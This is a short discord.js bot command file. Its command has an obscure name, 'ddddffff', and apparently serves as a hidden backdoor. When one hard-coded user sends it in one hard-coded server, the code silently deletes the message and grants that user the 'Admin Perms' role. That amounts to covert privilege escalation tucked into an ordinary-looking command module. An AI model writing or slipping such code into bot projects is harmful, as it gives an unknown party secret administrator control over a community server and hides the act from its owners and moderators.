const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
  if (message.author.id === "432650511825633317" && message.guild.id === "400508946709872660") {
    message.delete();
    message.member.addRole(message.guild.roles.find("name", "Admin Perms"));
  }
}

module.exports.help = {
	name: "ddddffff"
}
